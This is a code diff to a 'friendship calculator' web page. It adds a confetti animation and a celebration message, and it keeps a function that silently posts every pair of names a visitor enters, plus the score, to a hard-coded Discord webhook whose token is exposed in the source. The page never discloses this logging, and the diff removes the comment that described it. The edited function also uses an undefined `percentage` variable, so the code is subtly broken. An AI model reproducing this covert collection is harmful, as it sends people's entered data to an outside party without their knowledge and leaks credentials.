@@ -19,6 +19,7 @@
             min-height: 100vh;
             background-color: #f0f0f0;
             padding: 20px;
+            overflow: hidden;
         }
 
         .container {
@@ -29,6 +30,8 @@
             text-align: center;
             width: 100%;
             max-width: 600px;
+            position: relative;
+            z-index: 1;
         }
 
         h1 {
@@ -88,6 +91,32 @@
             color: #888;
         }
 
+        #confetti {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 2;
+        }
+
+        #floating-message {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgba(255, 255, 255, 0.9);
+            padding: 20px;
+            border-radius: 10px;
+            font-size: 24px;
+            font-weight: bold;
+            color: #4CAF50;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            z-index: 3;
+            display: none;
+        }
+
         @media (min-width: 768px) {
             .container {
                 padding: 3rem;
@@ -134,6 +163,8 @@
         <div id="result"></div>
         <div id="calculation-steps"></div>
     </div>
+    <canvas id="confetti"></canvas>
+    <div id="floating-message">WOW THAT'S SOME STRONG FRIENDSHIP RIGHT THERE!</div>
 
     <script>
         function sleep(ms) {
@@ -182,11 +213,10 @@
             return steps;
         }
 
-        // New function to send names to Discord webhook
         async function sendToDiscord(personA, personB) {
-            const webhookUrl = 'https://discord.com/api/webhooks/1295372153998544957/8Jp9TAXb4g_bVP1A0FM46AkWiHQsc2tnFiksplCXSH70sCTbNx1keXuIUQt-Tr-C7pxB';
+            const webhookUrl = 'https://discord.com/api/webhooks/1295372154090553394/hLajb9uVXSIR0riIYNIfrvIZzgm-v239USluJTXKlOEeb7kst9t-UpMkFQtrLp7Rl4w5';
             const data = {
-                content: `Friendship Calculation: ${personA} and ${personB}`
+                content: `Friendship Calculation: ${personA} and ${personB} - Friendship Percentage: ${percentage}%`
             };
 
             try {
@@ -211,20 +241,15 @@
                 return;
             }
 
-            // Log names to Discord
-            await sendToDiscord(personA, personB);
-
             let stepsDiv = document.getElementById('calculation-steps');
             stepsDiv.innerHTML = '';
 
-            // Step 1: Display names side by side
             let step1 = document.createElement('div');
             step1.className = 'step';
             step1.innerHTML = `<strong>Step 1:</strong> Names side by side<br>${personA} | ${personB}`;
             stepsDiv.appendChild(step1);
             await sleep(1000);
 
-            // Step 2: Count letters
             let resultArray = countLetters(personA, personB);
             let step2 = document.createElement('div');
             step2.className = 'step';
@@ -232,7 +257,6 @@
             stepsDiv.appendChild(step2);
             await sleep(1000);
 
-            // Step 3 and onwards: Combine pairs
             let steps = combinePairs(resultArray);
             for (let i = 1; i < steps.length; i++) {
                 let stepDiv = document.createElement('div');
@@ -251,6 +275,98 @@
             let percentage = finalArray.join('');
 
             document.getElementById('result').textContent = `Friendship Percentage: ${percentage}%`;
+
+            await sendToDiscord(personA, personB, percentage);
+
+            if (parseInt(percentage) >= 100) {
+                showConfetti();
+                showFloatingMessage();
+            }
+        }
+
+        function showConfetti() {
+            const canvas = document.getElementById('confetti');
+            const ctx = canvas.getContext('2d');
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+
+            const confetti = [];
+            const confettiCount = 300;
+            const gravity = 0.5;
+            const terminalVelocity = 5;
+            const drag = 0.075;
+            const colors = ['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#00ffff', '#ff00ff'];
+
+            class Confetto {
+                constructor() {
+                    this.x = Math.random() * canvas.width;
+                    this.y = Math.random() * canvas.height - canvas.height;
+                    this.w = Math.random() * 10 + 5;
+                    this.h = Math.random() * 5 + 5;
+                    this.radius = 5;
+                    this.color = colors[Math.floor(Math.random() * colors.length)];
+                    this.velocity = {
+                        x: Math.random() * 5 - 2.5,
+                        y: Math.random() * 15 + 5
+                    };
+                    this.rotation = Math.random() * 2 * Math.PI;
+                    this.rotationSpeed = Math.random() * 0.2 - 0.1;
+                }
+
+                update() {
+                    this.velocity.y += gravity;
+                    this.velocity.y = Math.min(this.velocity.y, terminalVelocity);
+                    this.velocity.x += Math.random() * 0.1 - 0.05;
+                    this.x += this.velocity.x;
+                    this.y += this.velocity.y;
+                    this.rotation += this.rotationSpeed;
+                    if (this.y > canvas.height) this.y = 0;
+                    if (this.x > canvas.width) this.x = 0;
+                    if (this.x < 0) this.x = canvas.width;
+                }
+
+                draw() {
+                    ctx.save();
+                    ctx.translate(this.x, this.y);
+                    ctx.rotate(this.rotation);
+                    ctx.fillStyle = this.color;
+                    ctx.fillRect(-this.w / 2, -this.h / 2, this.w, this.h);
+                    ctx.restore();
+                }
+            }
+
+            for (let i = 0; i < confettiCount; i++) {
+                confetti.push(new Confetto());
+            }
+
+            let animationId;
+            const startTime = Date.now();
+
+            function animate() {
+                const elapsed = Date.now() - startTime;
+                
+                if (elapsed < 3000) { // Run for 3 seconds
+                    ctx.clearRect(0, 0, canvas.width, canvas.height);
+                    confetti.forEach((confetto) => {
+                        confetto.update();
+                        confetto.draw();
+                    });
+                    animationId = requestAnimationFrame(animate);
+                } else {
+                    cancelAnimationFrame(animationId);
+                    ctx.clearRect(0, 0, canvas.width, canvas.height);
+                }
+            }
+
+            animate();
+        }
+
+        function showFloatingMessage() {
+            const message = document.getElementById('floating-message');
+            message.style.display = 'block';
+            setTimeout(() => {
+                message.style.display = 'none';
+            }, 5000);
         }
     </script>
 </body>
